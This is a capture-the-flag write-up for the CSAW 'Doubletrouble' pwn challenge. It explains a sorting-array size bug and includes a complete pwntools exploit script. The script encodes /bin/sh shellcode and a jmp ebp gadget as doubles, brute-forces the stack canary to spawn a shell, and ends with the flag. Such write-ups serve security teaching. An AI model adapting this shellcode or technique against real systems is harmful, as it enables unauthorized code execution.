# Doubletrouble
Description: Did you know every Number in javascript is a float

host: pwn.chal.csaw.io
port: 9002
creator: nsnc

## Bug
The `findArray()` function finds the first number between -100 and -10. It modifies the array size, and will increase it by the distance from the beginning of the array that the first element between -100 and -10 is found.

## Exploitation
1. Increase size of array
2. Place `jump ebp` gadget in the array
```python
jmpebp = '080497b800000000' # 4.86192279173924203790903928618E-270
```
2. Place address of beginning of the array on the stack so that it will be popped into ebp when it is sorted.
```python
stack_address = p.readline()[2:10]
shellcode_location = '080497b8' + stack_address # that first part is pading to be sorted in the right spot
```
3. Write some shellcode so that it will be sorted at the very beginning of the array.
```python
shellcode1 = 'fcfc56f631580b6a'
shellcode2 = 'f9f9f968732f2f68'
shellcode3 = 'f8e3896e69622f68'
shellcode4 = 'f7fa80cdca89c931'
shellcodesortedbelowthis = 'f7f94e24f7f94e24'
```
4. Run the exploit multiple times to bruteforce the stack canary
```python
#!/usr/bin/env python2
from pwn import *
import binascii
import codecs
import sys
'''
NOTE: Must be ran multiple times to brute force stack canary.
'''

def hextodouble(hexstring):
    return str('%.16E' % struct.unpack('!d',codecs.decode(hexstring, 'hex'))[0])

#context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']

while True:
    try:
        p = process("./doubletrouble")
        #p = remote('pwn.chal.csaw.io', 9002)

        stack_address = p.readline()[2:10]

        #shellcode
        shellcode1 = 'fcfc56f631580b6a'
        shellcode2 = 'f9f9f968732f2f68'
        shellcode3 = 'f8e3896e69622f68'
        shellcode4 = 'f7fa80cdca89c931'
        shellcodesortedbelowthis = 'f7f94e24f7f94e24'

        p.sendline("64")
        for i in range(4):
            p.sendline(hextodouble(shellcodesortedbelowthis))
        p.sendline("-11")
        for i in range(57 - 4): # subtract 4 for shellcode
            p.sendline(hextodouble(shellcodesortedbelowthis))

        p.sendline(hextodouble(shellcode1))
        p.sendline(hextodouble(shellcode2))
        p.sendline(hextodouble(shellcode3))
        p.sendline(hextodouble(shellcode4))

        jmpebp = '080497b800000000' # 4.86192279173924203790903928618E-270
        shellcode_location = '080497b8' + stack_address # that first part is pading to be sorted in the right spot
        print("shellcode_location: ")
        print(shellcode_location)
        print(hextodouble(shellcode_location))

        p.sendline(hextodouble(shellcode_location))
        p.sendline(hextodouble(jmpebp))

        p.interactive()
        p.close()
        raw_input()
    except KeyboardInterrupt:
        p.close()
        sys.exit()
    except EOFError:
        p.close()
```

## Flag
```
flag{4_d0ub1e_d0ub1e_3ntr3ndr3}
```
